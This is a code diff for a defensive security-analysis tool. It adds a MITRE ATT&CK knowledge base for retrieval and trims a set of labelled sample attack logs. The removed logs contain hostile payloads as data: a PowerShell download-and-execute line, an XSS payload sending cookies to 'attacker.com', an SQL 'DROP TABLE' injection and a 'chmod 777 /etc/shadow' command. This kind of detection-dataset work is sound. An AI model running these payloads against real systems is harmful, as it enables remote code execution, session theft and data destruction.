@@ -1,35 +1,60 @@
 import json
+import os
 from typing import List, Dict
 
-# NOVA Phase 1: Definitive 20-Log Cybersecurity Dataset
-def load_sample_dataset() -> List[Dict]:
-    """Returns the merged set of 20 sample cyber logs."""
-    logs = [
-        # User's Suggested 5
+# NOVA Phase 2: Comprehensive MITRE ATT&CK Knowledge Base Initializer
+MITRE_DATA = [
+    {"id": "T1566", "name": "Phishing", "description": "Sending spearphishing emails to gain initial access via malicious attachments or links."},
+    {"id": "T1110", "name": "Brute Force", "description": "Attacking account passwords by guessing or systematically checking combinations."},
+    {"id": "T1071", "name": "Command and Control (C2) - Web Protocols", "description": "Using standard HTTP/S protocols to communicate with malware for exfiltration or control."},
+    {"id": "T1059", "name": "Command and Scripting Interpreter", "description": "Leveraging PowerShell, Python, or Windows Command Shell to execute malicious logic."},
+    {"id": "T1567", "name": "Data Exfiltration Over Web Service", "description": "Stealing data by uploading it to legitimate cloud services or external IPs."},
+    {"id": "T1021", "name": "Remote Services", "description": "Using legitimate remote management tools like RDP or SSH to move laterally within a network."},
+    {"id": "T1003", "name": "OS Credential Dumping", "description": "Harvesting credentials from operating system memory or files (e.g., LSASS memory)."},
+    {"id": "T1078", "name": "Valid Accounts", "description": "Using compromised credentials for legitimate accounts to gain access and persist."},
+    {"id": "T1548", "name": "Abuse Elevation Control Mechanism", "description": "Leveraging UAC or Sudo to gain higher privileges (e.g., Administrator or Root)."},
+    {"id": "T1190", "name": "Exploit Public-Facing Application", "description": "Targeting vulnerabilities in web servers (SQL Injection, Heap Overflow, etc.)."},
+    {"id": "T1210", "name": "Exploitation of Remote Services", "description": "Targeting vulnerabilities like EternalBlue or Log4j to gain access from outside."},
+    {"id": "T1048", "name": "Exfiltration Over Alternative Protocol", "description": "Using DNS, ICMP, or non-standard ports to sneak data out of the network."},
+    {"id": "T1053", "name": "Scheduled Task/Job", "description": "Achieving persistence by scheduling malicious scripts to run at specific times."},
+    {"id": "T1486", "name": "Data Encrypted for Impact", "description": "The primary mechanism of Ransomware: encrypting user data to deny access."},
+    {"id": "T1562", "name": "Impair Defenses", "description": "Disabling EDR, Antivirus, or Firewall processes to avoid detection."},
+    {"id": "T1070", "name": "Indicator Removal", "description": "Deleting logs or history to hide traces of the intrusion."},
+    {"id": "T1552", "name": "Unsecured Credentials", "description": "Searching local files for passwords stored in cleartext."},
+    {"id": "T1090", "name": "Proxy/External Gateways", "description": "Using external gateways to proxy malicious traffic and hide the origin."},
+    {"id": "T1134", "name": "AccessToken Manipulation", "description": "Forging or stealing security tokens to impersonate users."},
+    {"id": "T1484", "name": "Domain Policy Modification", "description": "Changing Group Policy Objects (GPO) to propagate malware across a domain."},
+    {"id": "T1543", "name": "Create or Modify System Process", "description": "Creating new Windows services or system processes for persistence."},
+    {"id": "T1037", "name": "Boot or Logon Initialization Scripts", "description": "Using startup scripts to execute malicious payloads upon logon."},
+    {"id": "T1558", "name": "Steal or Forge Kerberos Tickets", "description": "Golden Ticket or Silver Ticket attacks for domain-wide persistence."},
+    {"id": "T1046", "name": "Network Service Discovery", "description": "Scanning the internal network for open ports and vulnerable services."},
+    {"id": "T1135", "name": "Network Share Discovery", "description": "Searching for accessible SMB/NFS shares to find sensitive documents."},
+    {"id": "T1560", "name": "Archive Collected Data", "description": "Compressing or encrypting exfiltrated data before upload (e.g., ZIP with password)."},
+    {"id": "T1041", "name": "Exfiltration Over C2 Channel", "description": "Merging exfiltrated data into standard command-and-control heartbeats."},
+    {"id": "T1491", "name": "Defacement", "description": "Changing the visual appearance of a website for geopolitical or hacktivist reasons."},
+    {"id": "T1531", "name": "Account Access Removal", "description": "Locking out legitimate administrators to prevent incident response."},
+    {"id": "T1027", "name": "Obfuscated Files or Information", "description": "Encrypting or encoding payloads to bypass static signature detection."}
+]
+
+def initialize_rag():
+    """Seed the RAG knowledge base with MITRE ATT&CK data."""
+    from rag_tool import RAGSearchTool
+    rag = RAGSearchTool()
+    
+    docs = [f"ID: {item['id']} | Name: {item['name']} | Description: {item['description']}" for item in MITRE_DATA]
+    ids = [item['id'] for item in MITRE_DATA]
+    rag.add_knowledge(documents=docs, ids=ids)
+    return f"Initialized RAG with {len(ids)} MITRE ATT&CK entries."
+
+def load_sample_logs():
+    """Legacy/Phase 1 sample logs for testing."""
+    return [
         {"id": 1, "raw": "Failed login attempts from IP 45.67.89.12 (25 times in 5 min)", "label": "brute_force"},
         {"id": 2, "raw": "User 'admin' accessed sensitive HR database at 02:15 AM", "label": "insider_threat"},
         {"id": 3, "raw": "Normal traffic spike during business hours from known VPN", "label": "normal"},
         {"id": 4, "raw": "Suspicious PowerShell script execution on endpoint WIN-XYZ", "label": "malware"},
         {"id": 5, "raw": "Multiple DNS queries to rare domain 'x7k9p4q2z.com'", "label": "c2_beaconing"},
-        
-        # My Previous Detailed 15 (renamed/adapted)
-        {"id": 6, "raw": "2026-04-13 22:20:05 [APP] user: 'jdoe' downloaded 500 files from '/secret/financials/' - Action: DOWNLOAD", "label": "data_exfiltration"},
-        {"id": 7, "raw": "2026-04-13 22:25:30 [WAF] SQL Injection detected in 'search' query: 'SELECT * FROM users WHERE id=1; DROP TABLE users;' from 185.23.44.110", "label": "sql_injection"},
-        {"id": 8, "raw": "2026-04-13 22:30:12 [PS] process: 'powershell.exe' executed command: 'IEX(New-Object Net.WebClient).DownloadString(\"http://malware.evil/shell.ps1\")' by user: 'service_account'", "label": "rce"},
-        {"id": 9, "raw": "2026-04-13 22:35:45 [SMTP] Email sent to 500 recipients from 'noreply@yourcompany.com' with attachment 'invoice.zip.exe' from internal IP 10.0.0.101", "label": "phishing"},
-        {"id": 10, "raw": "2026-04-13 22:40:02 [IDS] Suricata Alert: ET EXPLOIT possible CVE-2026-9999 heap overflow from 92.45.1.20 to 10.0.0.5", "label": "exploit_attempt"},
-        {"id": 11, "raw": "2026-04-13 22:45:15 [AUTH] SUCCESS login for user 'admin' from 192.168.1.5 after 30 failed attempts", "label": "account_takeover"},
-        {"id": 12, "raw": "2026-04-13 22:50:30 [DNS] High volume of DNS TXT queries to 'tunnel.badactor.com' from 10.0.0.5", "label": "dns_tunneling"},
-        {"id": 13, "raw": "2026-04-13 22:55:01 [APP] user: 'mstone' changed password for 15 other accounts in 2 minutes", "label": "privilege_escalation"},
-        {"id": 14, "raw": "2026-04-13 23:00:45 [EDR] suspicious driver 'kernel_rootkit.sys' loaded by process: 'svchost.exe'", "label": "rootkit_installation"},
-        {"id": 15, "raw": "2026-04-13 23:05:12 [FIREWALL] Blocked port scanning activity from 77.88.99.100 on multiple ports", "label": "reconnaissance"},
-        {"id": 16, "raw": "2026-04-13 23:10:45 [AUTH] FAILED login for user 'guest' from 10.0.0.25 (10 times in 1 min)", "label": "brute_force"},
-        {"id": 17, "raw": "2026-04-13 23:15:12 [APP] user: 'developer' executed 'chmod 777 /etc/shadow'", "label": "root_access_attempt"},
-        {"id": 18, "raw": "2026-04-13 23:20:01 [NETWORK] Large data transfer (10GB) to external IP 203.0.113.5", "label": "data_exfiltration"},
-        {"id": 19, "raw": "2026-04-13 23:25:30 [WAF] XSS payload found in comment: '<script>fetch(\"http://attacker.com/steal?\"+document.cookie)</script>'", "label": "xss_attack"},
-        {"id": 20, "raw": "2026-04-13 23:30:12 [SMTP] Inbound email from 'spoofed-domain.com' with malicious link", "label": "phishing"}
     ]
-    return logs
 
 def save_report(report_data, filename="nova_report.json"):
     """Saves the final NOVA report to a JSON file."""
